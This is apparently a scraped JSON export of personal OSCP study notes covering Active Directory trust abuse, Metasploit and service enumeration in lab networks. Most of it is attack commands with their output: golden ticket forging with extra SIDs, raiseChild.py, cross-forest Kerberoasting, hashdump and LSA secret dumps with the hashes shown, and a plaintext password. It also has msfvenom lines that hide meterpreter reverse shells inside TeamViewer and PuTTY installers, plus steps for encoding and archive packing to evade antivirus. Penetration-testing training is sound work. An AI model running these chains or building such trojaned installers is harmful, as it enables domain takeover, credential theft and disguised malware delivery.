Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation Password: [*] Brute forcing SIDs at 172.16.5.240 [*] StringBinding ncacn_np:172.16.5.240[\\pipe\\lsarpc] [*] Domain SID is: S-1-5-21-2806153819-209893948-922872689 500: LOGISTICS\\Administrator (SidTypeUser) 501: LOGISTICS\\Guest (SidTypeUser) 502: LOGISTICS\\krbtgt (SidTypeUser) 512: LOGISTICS\\Domain Admins (SidTypeGroup) 513: LOGISTICS\\Domain Users (SidTypeGroup) 514: LOGISTICS\\Domain Guests (SidTypeGroup) 515: LOGISTICS\\Domain Computers (SidTypeGroup) 516: LOGISTICS\\Domain Controllers (SidTypeGroup) 517: LOGISTICS\\Cert Publishers Grabbing the Domain SID \u0026 Attaching to Enterprise Admin‚Äôs RID Attacking Domain Trusts - Child -\u003e Parent Trusts - from Linux\ncube111@local[/local]$ lookupsid.py logistics.inlanefreight.local/local-student_adm@172.16.5.5 | grep -B12 \"Enterprise Admins\" Password: [*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114 498: INLANEFREIGHT\\Enterprise Read-only Domain Controllers (SidTypeGroup) 500: INLANEFREIGHT\\administrator (SidTypeUser) 501: INLANEFREIGHT\\guest (SidTypeUser) 502: INLANEFREIGHT\\krbtgt (SidTypeUser) 512: INLANEFREIGHT\\Domain Admins (SidTypeGroup) 513: INLANEFREIGHT\\Domain Users (SidTypeGroup) 514: INLANEFREIGHT\\Domain Guests (SidTypeGroup) 515: INLANEFREIGHT\\Domain Computers (SidTypeGroup) 516: INLANEFREIGHT\\Domain Controllers (SidTypeGroup) 517: INLANEFREIGHT\\Cert Publishers (SidTypeAlias) 518: INLANEFREIGHT\\Schema Admins (SidTypeGroup) 519: INLANEFREIGHT\\Enterprise Admins (SidTypeGroup) The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f The SID for the child domain: S-1-5-21-2806153819-209893948-922872689 The name of a target user in the child domain (does not need to exist!): hacker The FQDN of the child domain: LOGISTICS.INLANEFREIGHT.LOCAL The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519\nConstructing a Golden Ticket using ticketer.py Attacking Domain Trusts - Child -\u003e Parent Trusts - from Linux\nConstructing a Golden Ticket using ticketer.py Attacking Domain Trusts - Child -\u003e Parent Trusts - from Linux\ncube111@local[/local]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation [*] Creating basic skeleton ticket and PAC Infos [*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker [*] PAC_LOGON_INFO [*] PAC_CLIENT_INFO_TYPE [*] EncTicketPart [*] EncAsRepPart [*] Signing/Encrypting final ticket [*] PAC_SERVER_CHECKSUM Setting the KRB5CCNAME Environment Variable Attacking Domain Trusts - Child -\u003e Parent Trusts - from Linux\ncube111@local[/local]$ export KRB5CCNAME=hacker.ccache Getting a SYSTEM shell using Impacket‚Äôs psexec.py Attacking Domain Trusts - Child -\u003e Parent Trusts - from Linux\ncube111@local[/local]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation [*] Requesting shares on 172.16.5.5..... [*] Found writable share ADMIN$ [*] Uploading file nkYjGWDZ.exe Performing the Attack with raiseChild.py Attacking Domain Trusts - Child -\u003e Parent Trusts - from Linux\ncube111@local[/local]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/local-student_adm Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation Password: [*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL [*] Forest FQDN is: INLANEFREIGHT.LOCAL [*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL [*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519 [*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f::: LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8 [*] Getting credentials for INLANEFREIGHT.LOCAL Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows Enumerating Accounts for Associated SPNs Using Get-DomainUser Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows\nPS C:\\local\u003e Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName samaccountname -------------- krbtgt mssqlsvc PS C:\\local\u003e Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof samaccountname memberof -------------- -------- mssqlsvc CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL Performing a Kerberoasting Attacking with Rubeus Using /domain Flag PS C:\\local\u003e .\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.0.2 [*] Action: Kerberoasting [*] NOTICE: AES hashes will be returned for AES-enabled accounts. [*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. [*] Target User : mssqlsvc [*] Target Domain : FREIGHTLOGISTICS.LOCAL [*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(\u0026(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' [*] Total kerberoastable users : 1 [*] SamAccountName : mssqlsvc [*] DistinguishedName : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL [*] ServicePrincipalName : MSSQLsvc/sql01.freightlogstics:1433 [*] PwdLastSet : 3/24/2022 12:47:52 PM [*] Supporte Accessing DC03 Using Enter-PSSession Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows\nPS C:\\local\u003e Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\\administrator [ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\\Users\\administrator.INLANEFREIGHT\\Documents\u003e whoami inlanefreight\\administrator [ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\\Users\\administrator.INLANEFREIGHT\\Documents\u003e ipconfig /all Windows IP Configuration Cross-Forest Kerberoasting Using GetUserSPNs.py Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux\ncube111@local[/local]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ----------------------------------- -------- ------------------------------------------------------ -------------------------- --------- ---------- MSSQLsvc/sql01.freightlogstics:1433 mssqlsvc CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL Using the -request Flag Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux\ncube111@local[/local]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ----------------------------------- -------- ------------------------------------------------------ -------------------------- --------- ---------- MSSQLsvc/sql01.freightlogstics:1433 mssqlsvc CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL 2022-03-24 15:47:52.488917 \u003cnever\u003e $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10\u003cSNIP\u003e Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux\ncube111@local[/local]$ cat /etc/resolv.conf # Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8) # DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN # 127.0.0.53 is the systemd-resolved stub resolver. # run \"resolvectl status\" to see details about the actual nameservers. #nameserver 1.1.1.1 #nameserver 8.8.8.8 domain INLANEFREIGHT.LOCAL Running bloodhound-python Against INLANEFREIGHT.LOCAL Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux\ncube111@local[/local]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2 INFO: Found AD domain: inlanefreight.local INFO: Connecting to LDAP server: ACADEMY-EA-DC01 INFO: Found 1 domains INFO: Found 2 domains in the forest INFO: Found 559 computers INFO: Connecting to LDAP server: ACADEMY-EA-DC01 INFO: Found 2950 users INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL INFO: Found 183 groups INFO: Found 2 trusts Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux\ncube111@local[/local]$ cat /etc/resolv.conf # Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8) # DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN # 127.0.0.53 is the systemd-resolved stub resolver. # run \"resolvectl status\" to see details about the actual nameservers. #nameserver 1.1.1.1 #nameserver 8.8.8.8 domain FREIGHTLOGISTICS.LOCAL nameserver 172.16.5.238 The bloodhound-python command will look similar to the previous one:\nRunning bloodhound-python Against FREIGHTLOGISTICS.LOCAL Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux\ncube111@local[/local]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2 INFO: Found AD domain: freightlogistics.local INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 5 computers INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL INFO: Found 9 users INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL INFO: Found 52 groups INFO: Found 1 trusts INFO: Starting computer enumeration with 10 workers Hardening Active Directory S C:\\Users\\local-student\u003e Get-ADGroup -Identity \"Protected Users\" -Properties Name,Description,Members Description : Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information. DistinguishedName : CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL GroupCategory : Security GroupScope : Global Members : {CN=sqlprod,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL, CN=sqldev,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL} Name : Protected Users ObjectClass : group ObjectGUID : e4e19353-d08f-4790-95bc-c544a38cd534 SamAccountName : Protected Users SID : S-1-5-21-2974783224-3764228556-2640795941-525 Additional AD Auditing Techniques Creating a Snapshot of AD with AD Explorer PingCastle PingCastle is a powerful tool that evaluates the security posture of an AD environment and provides us the results in several different maps and graphs. Thinking about security for a second, if you do not have an active inventory of the hosts in your enterprise, PingCastle can be a great resource to help you gather one in a nice user-readable map of the domain. PingCastle is different from tools such as PowerView and BloodHound because, aside from providing us with enumeration data that can inform our attacks, it also provides a detailed report of the target domain‚Äôs security level using a methodology based on a risk assessment/maturity framework. The scoring shown in the report is based on the Capability Maturity Model Integration (CMMI). For a quick look at the help context provided, you can issue the --help switch in cmd-promp\nC:\\local\u003e PingCastle.exe --help switch: --help : display this message --interactive : force the interactive mode --log : generate a log file --log-console : add log to the console --log-samba \u003coption\u003e: enable samba login (example: 10) Common options when connecting to the AD --server \u003cserver\u003e : use this server (default: current domain controller) the special value * or *.forest do the healthcheck for all domains --port \u003cport\u003e : the port to use for ADWS or LDAP (default: 9389 or 389) --user \u003cuser\u003e : use this user (default: integrated authentication) --password \u003cpass\u003e : use this password (default: asked on a secure prompt) --protocol \u003cproto\u003e : selection the protocol to use among LDAP or ADWS (fastest) : ADWSThenLDAP (default), ADWSOnly, LDAPOnly, LDAPThenADWS Group3r Group3r is a tool purpose-built to find vulnerabilities in Active Directory associated Group Policy. Group3r must be run from a domain-joined host with a domain user (it does not need to be an administrator), or in the context of a domain user (i.e., using runas /netonly).\nGroup3r Basic Usage Additional AD Auditing Techniques\nC:\\local\u003e group3r.exe -f \u003cfilepath-name.log Running ADRecon Additional AD Auditing Techniques\nPS C:\\local\u003e .\\ADRecon.ps1 [*] ADRecon v1.1 by Prashant Mahajan (@prashant3535) [*] Running on INLANEFREIGHT.LOCAL\\MS01 - Member Server [*] Commencing - 03/28/2022 09:24:58 [-] Domain [-] Forest [-] Trusts [-] Sites [-] Subnets [-] SchemaHistory - May take some time [-] Default Password Policy [-] Fine Grained Password Policy - May need a Privileged Account [-] Domain Controllers [-] Users and SPNs - May take some time [-] PasswordAttributes - Experimental [-] Groups and Membership Changes - May take some time [-] Group Memberships - May take some time [-] OrganizationalUnits (OUs) [-] GPOs [-] gPLinks - Scope of Management (SOM) [-] DNS Zones and Records [-] Printers [-] Computers and SPNs - May take some time [-] LAPS - Needs Privileged Account [-] BitLocker Recovery Keys - Needs Privileged Account [-] GPOReport - May take some time [*] Total Execution Time (mins): 11.05 [*] Output Directory: C:\\Tools\\ADRecon-Report-20220328092458",
    "description": "https://github.com/initstring/linkedin2username\n==TOOLS==\nTool Description PowerView/SharpView A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some ‚Äúquick wins‚Äù such as users that can be attacked via Kerberoasting or ASREPRoasting.",
    "tags": [],
    "title": "The Active Directory",
    "uri": "/oscp-notes/the-active-directory/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "permanent host set\nmsf6 exploit(windows/smb/ms17_010_psexec) \u003e set RHOSTS 10.10.10.40 msf6 \u003e search type:exploit platform:windows cve:2021 rank:excellent microsoft msf6 auxiliary(scanner/ssh/ssh_login) \u003e search type:payload platform:windows arch:x64 reverse_tcp MSF - Show Targets Targets\nmsf6 \u003e show targets [-] No exploit module selected. msf6 exploit(windows/browser/ie_execcommand_uaf) \u003e show targets Exploit targets: Id Name -- ---- 0 Automatic 1 IE 7 on Windows XP SP3 2 IE 8 on Windows XP SP3 3 IE 7 on Windows Vista 4 IE 8 on Windows Vista 5 IE 8 on Windows 7 6 IE 9 on Windows 7 msf6 exploit(windows/browser/ie_execcommand_uaf) \u003e set target 6 target =\u003e 6 For example, windows/shell_bind_tcp is a single payload with no stage, whereas windows/shell/bind_tcp consists of a stager (bind_tcp) and a stage (shell).\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u003e grep meterpreter grep reverse_tcp show payloads 15 payload/windows/x64/meterpreter/reverse_tcp normal No Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager 16 payload/windows/x64/meterpreter/reverse_tcp_rc4 normal No Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm) 17 payload/windows/x64/meterpreter/reverse_tcp_uuid normal No Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64) msf6 exploit(windows/smb/ms17_010_eternalblue) \u003e grep -c meterpreter grep reverse_tcp show payloads [*] 3 shikata gai nai encoding\ncube111@local[/local]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe cube111@local[/local]$ msf-virustotal -k \u003cAPI key\u003e -f TeamViewerInstall.exe Databases cube111@local[/local]$ sudo msfdb init cube111@local[/local]$ sudo msfdb run Databases\nmsf6 \u003e workspace -a Target_1 [*] Added workspace: Target_1 [*] Workspace: Target_1 msf6 \u003e workspace Target_1 [*] Workspace: Target_1 msf6 \u003e workspace default * Target_1 msf6 \u003e db_import Target.xml msf6 \u003e hosts msf6 \u003e services MSF - DB Export Databases\nmsf6 \u003e db_export -h MSF - Stored Credentials Databases\nmsf6 \u003e creds -h Loot The loot command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.\nMSF - Stored Loot Databases\nmsf6 \u003e loot -h Downloading MSF Plugins Plugins\ncube111@local[/local]$ git clone https://github.com/darkoperator/Metasploit-Plugins cube111@local[/local]$ ls Metasploit-Plugins aggregator.rb ips_filter.rb pcap_log.rb sqlmap.rb alias.rb komand.rb pentest.rb thread.rb auto_add_route.rb lab.rb request.rb token_adduser.rb beholder.rb libnotify.rb rssfeed.rb token_hunter.rb db_credcollect.rb msfd.rb sample.rb twitt.rb db_tracker.rb msgrpc.rb session_notifier.rb wiki.rb event_tester.rb nessus.rb session_tagger.rb wmap.rb ffautoregen.rb nexpose.rb socket_logger.rb growl.rb openvas.rb sounds.rb cube111@local[/local]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb MSF - Searching for Exploit Meterpreter\nmsf6 \u003e search iis_webdav_upload_asp msf6 exploit(windows/iis/iis_webdav_upload_asp) \u003e search local_exploit_suggester meterpreter \u003e getuid MSF - Dumping Hashes Meterpreter\nmeterpreter \u003e hashdump Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca::: ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88::: IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16::: Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c::: SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6::: meterpreter \u003e lsa_dump_sam [+] Running as SYSTEM [*] Dumping SAM Domain : GRANNY SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb Local SID : S-1-5-21-1709780765-3897210020-3926566182 SAMKey : 37ceb48682ea1b0197c7ab294ec405fe RID : 000001f4 (500) meterpreter \u003e lsa_dump_sam meterpreter \u003e lsa_dump_secrets Custom mudule\n[!bash!]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb [!bash!]$ msfconsole -m /usr/share/metasploit-framework/modules/ cube111@local[/local]$ msfconsole -q msf6 \u003e use multi/handler msf6 exploit(multi/handler) \u003e show options Module options (exploit/multi/handler): MSF - Searching for Local Exploit Suggester Introduction to MSFVenom\nmsf6 \u003e search local exploit suggester \u003c...SNIP...\u003e 2375 post/multi/manage/screenshare normal No Multi Manage the screen of the target meterpreter session 2376 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester 2377 post/osx/gather/apfs_encrypted_volume_passwd 2018-03-21 normal Yes Mac OS X APFS Encrypted Volume Password Disclosure \u003cSNIP\u003e IDS/IPS Evasion\nmsfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5 msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lport=4444 -e x86/shikata_ga_nai -i 3 -b \"\\x00\" -f exe -o puttyX.exe Archive¬†[!bash!]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz [!bash!]$ tar -xzvf rarlinux-x64-612.tar.gz \u0026\u0026 cd rar msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5 [!bash!]$ rar a ~/test.rar -p ~/test.js Removing the .RAR Extension [!bash!]$ mv test.rar test [!bash!]$ ls Archiving the Payload Again [!bash!]$ rar a test2.rar -p test Enter password (will not be echoed): ****** Reenter password: ****** Removing the .RAR Extension [!bash!]$ mv test2.rar test2 [!bash!]$ ls test test2 test.js The test2 file is the final .rar archive with the extension (.rar) deleted from the name. After that, we can proceed to upload it on VirusTotal for another check.\nVirusTotal [!bash!]$ msf-virustotal -k \u003cAPI key\u003e -f test2",
    "description": "permanent host set\nmsf6 exploit(windows/smb/ms17_010_psexec) \u003e set RHOSTS 10.10.10.40 msf6 \u003e search type:exploit platform:windows cve:2021 rank:excellent microsoft msf6 auxiliary(scanner/ssh/ssh_login) \u003e search type:payload platform:windows arch:x64 reverse_tcp MSF - Show Targets Targets\nmsf6 \u003e show targets [-] No exploit module selected. msf6 exploit(windows/browser/ie_execcommand_uaf) \u003e show targets Exploit targets: Id Name -- ---- 0 Automatic 1 IE 7 on Windows XP SP3 2 IE 8 on Windows XP SP3 3 IE 7 on Windows Vista 4 IE 8 on Windows Vista 5 IE 8 on Windows 7 6 IE 9 on Windows 7 msf6 exploit(windows/browser/ie_execcommand_uaf) \u003e set target 6 target =\u003e 6 For example, windows/shell_bind_tcp is a single payload with no stage, whereas windows/shell/bind_tcp consists of a stager (bind_tcp) and a stage (shell).",
    "tags": [],
    "title": "The Metasploit Framework",
    "uri": "/oscp-notes/the-metasploit-framework/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "cube111@local[/local]$ git clone https://github.com/jtesta/ssh-audit.git \u0026\u0026 cd ssh-audit cube111@local[/local]$ ./ssh-audit.py 10.129.14.132 # general (gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3 (gen) software: OpenSSH 8.2p1 (gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2018.76+ (gen) compression: enabled (zlib@openssh.com) # key exchange algorithms (kex) curve25519-sha256 -- [info] available since OpenSSH 7.4, Dropbear SSH 2018.76 (kex) curve25519-sha256@libssh.org -- [info] available since OpenSSH 6.5, Dropbear SSH 2013.62 (kex) ecdh-sha2-nistp256 -- [fail] using weak elliptic curves `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62 (kex) ecdh-sha2-nistp384 -- [fail] using weak elliptic curves `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62 (kex) ecdh-sha2-nistp521 -- [fail] using weak elliptic curves `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62 (kex) diffie-hellman-group-exchange-sha256 (2048-bit) -- [info] available since OpenSSH 4.4 (kex) diffie-hellman-group16-sha512 -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73 (kex) diffie-hellman-group18-sha512 -- [info] available since OpenSSH 7.3 (kex) diffie-hellman-group14-sha256 -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73 # host-key algorithms (key) rsa-sha2-512 (3072-bit) -- [info] available since OpenSSH 7.2 (key) rsa-sha2-256 (3072-bit) -- [info] available since OpenSSH 7.2 (key) ssh-rsa (3072-bit) -- [fail] using weak hashing algorithm `- [info] available since OpenSSH 2.5.0, Dropbear SSH 0.28 `- [info] a future deprecation notice has been issued in OpenSSH 8.2: https://www.openssh.com/txt/release-8.2 (key) ecdsa-sha2-nistp256 -- [fail] using weak elliptic curves `- [warn] using weak random number generator could reveal the key `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62 (key) ssh-ed25519 -- [info] available since OpenSSH 6.5 ...SNIP... ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password RSYNC\ncube111@local[/local]$ sudo nmap -sV -p 873 127.0.0.1 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 09:31 EDT Nmap scan report for localhost (127.0.0.1) Host is up (0.0058s latency). PORT STATE SERVICE VERSION 873/tcp open rsync (protocol version 31) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds cube111@local[/local]$ nc -nv 127.0.0.1 873 (UNKNOWN) [127.0.0.1] 873 (rsync) open @RSYNCD: 31.0 @RSYNCD: 31.0 #list dev Dev Tools @RSYNCD: EXIT cube111@local[/local]$ rsync -av --list-only rsync://127.0.0.1/dev receiving incremental file list drwxr-xr-x 48 2022/09/19 09:43:10 . -rw-r--r-- 0 2022/09/19 09:34:50 build.sh -rw-r--r-- 0 2022/09/19 09:36:02 secrets.yaml drwx------ 54 2022/09/19 09:43:10 .ssh sent 25 bytes received 221 bytes 492.00 bytes/sec total size is 0 speedup is 0.00 command rsync -av rsync://127.0.0.1/dev. If Rsync is configured to use SSH to transfer files, we could modify our commands to include the -e ssh flag, or -e \"ssh -p2222\" if a non-standard port is in use for SSH. This guide is helpful for understanding the syntax for using Rsync over SSH.\nhttps://hackviser.com/tactics/pentesting/services/rsync\nR CONNET\ncube111@local[/local]$ sudo nmap -sV -p 512,513,514 10.0.17.2 cube111@local[/local]$ rlogin 10.0.17.2 -l local-student Last login: Fri Dec 2 16:11:21 from localhost [local-student@localhost ~]$",
    "description": "cube111@local[/local]$ git clone https://github.com/jtesta/ssh-audit.git \u0026\u0026 cd ssh-audit cube111@local[/local]$ ./ssh-audit.py 10.129.14.132 # general (gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3 (gen) software: OpenSSH 8.2p1 (gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2018.76+ (gen) compression: enabled (zlib@openssh.com) # key exchange algorithms (kex) curve25519-sha256 -- [info] available since OpenSSH 7.4, Dropbear SSH 2018.76 (kex) curve25519-sha256@libssh.org -- [info] available since OpenSSH 6.5, Dropbear SSH 2013.62 (kex) ecdh-sha2-nistp256 -- [fail] using weak elliptic curves `- [info] available since OpenSSH 5.",
    "tags": [],
    "title": "Linux Remote Management",
    "uri": "/oscp-notes/linux-remote-management/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "RDP\ncube111@local[/local]$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp* Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 15:45 CET Nmap scan report for 10.129.201.248 Host is up (0.036s latency). PORT STATE SERVICE VERSION 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-enum-encryption: | Security layer | CredSSP (NLA): SUCCESS | CredSSP with Early User Auth: SUCCESS |_ RDSTLS: SUCCESS | rdp-ntlm-info: | Target_Name: ILF-SQL-01 | NetBIOS_Domain_Name: ILF-SQL-01 | NetBIOS_Computer_Name: ILF-SQL-01 | DNS_Domain_Name: ILF-SQL-01 | DNS_Computer_Name: ILF-SQL-01 | Product_Version: 10.0.17763 |_ System_Time: 2021-11-06T13:46:00+00:00 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds cube111@local[/local]$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp* In addition, we can use --packet-trace to track the individual packages and inspect their contents manually. We can see that the RDP cookies (mstshash=nmap) used by Nmap to interact with the RDP server can be identified by threat hunters and various security services such as Endpoint Detection and Response (EDR), and can lock us out as penetration testers on hardened networks.\nWindows Remote Management Protocols\ncube111@local[/local]$ nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:23 CET SENT (0.2506s) ICMP [10.10.14.20 \u003e 10.129.201.248 Echo request (type=8/code=0) id=8338 seq=0] IP [ttl=53 id=5122 iplen=28 ] SENT (0.2507s) TCP 10.10.14.20:55516 \u003e 10.129.201.248:443 S ttl=42 id=24195 iplen=44 seq=1926233369 win=1024 \u003cmss 1460\u003e SENT (0.2507s) TCP 10.10.14.20:55516 \u003e 10.129.201.248:80 A ttl=55 id=50395 iplen=40 seq=0 win=1024 SENT (0.2517s) ICMP [10.10.14.20 \u003e 10.129.201.248 Timestamp request (type=13/code=0) id=8247 seq=0 orig=0 recv=0 trans=0] IP [ttl=38 id=62695 iplen=40 ] RCVD (0.2814s) ICMP [10.129.201.248 \u003e 10.10.14.20 Echo reply (type=0/code=0) id=8338 seq=0] IP [ttl=127 id=38158 iplen=28 ] SENT (0.3264s) TCP 10.10.14.20:55772 \u003e 10.129.201.248:3389 S ttl=56 id=274 iplen=44 seq=2635590698 win=1024 \u003cmss 1460\u003e RCVD (0.3565s) TCP 10.129.201.248:3389 \u003e 